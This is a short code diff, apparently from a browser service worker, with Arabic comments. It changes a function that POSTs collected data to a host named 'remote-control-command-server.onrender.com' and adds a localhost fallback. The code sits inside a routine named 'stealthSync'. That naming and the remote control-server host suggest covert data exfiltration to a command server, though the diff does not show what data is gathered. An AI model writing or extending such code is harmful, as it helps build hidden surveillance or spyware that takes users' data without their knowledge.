@@ -704,7 +704,13 @@ async function stealthSync() {
 // مزامنة البيانات للخادم
 async function syncDataToServer(data) {
     try {
-        const response = await fetch('https://remote-control-command-server.onrender.com/data', {
+        // تحديد الرابط الصحيح بناءً على البيئة
+        const isLocalhost = self.location.hostname === 'localhost' || self.location.hostname === '127.0.0.1';
+        const serverUrl = isLocalhost 
+            ? 'http://localhost:10001/data' 
+            : 'https://remote-control-command-server.onrender.com/data';
+        
+        const response = await fetch(serverUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
